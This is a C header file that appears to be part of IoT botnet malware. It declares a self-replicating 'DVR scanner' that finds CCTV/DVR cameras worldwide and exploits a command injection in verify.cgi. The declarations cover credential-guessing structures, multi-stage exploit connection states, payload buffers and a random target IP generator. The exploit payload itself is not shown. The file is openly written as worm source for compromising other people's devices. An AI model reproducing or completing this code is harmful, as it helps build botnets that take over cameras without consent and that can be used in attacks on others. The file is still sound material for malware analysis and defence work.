#ifdef SELFREP

/* ============================================================================
 * DVR SCANNER - CCTV/DVR Camera Exploitation (Port 80)
 * ============================================================================
 * Exploit: DVR camera command injection via verify.cgi
 * Targets: CCTV/DVR cameras globally
 * Regions: Asia, Middle East, Africa, Latin America
 * Brands: Various DVR camera manufacturers
 * ============================================================================ */

#pragma once

#include <stdint.h>

#include "includes.h"

#define DVR_SCANNER_MAX_CONNS   256
#define DVR_SCANNER_RAW_PPS     788

#define DVR_SCANNER_RDBUF_SIZE  1080
#define DVR_SCANNER_HACK_DRAIN  64

struct dvr_scanner_auth {
    char *username;
    char *password;
    uint16_t weight;
};

struct dvr_scanner_connection
{
    int fd, last_recv;
    enum
    {
        DVR_SC_CLOSED,
        DVR_SC_CONNECTING,
        DVR_SC_GET_CREDENTIALS,
        DVR_SC_EXPLOIT_STAGE2,
        DVR_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[DVR_SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[5000], payload_buf2[5000];
    int credential_index;
};

void dvr_scanner_init();
void dvr_kill(void);

static void dvr_setup_connection(struct dvr_scanner_connection *);
static ipv4_t get_random_dvr_ip(void);

#endif
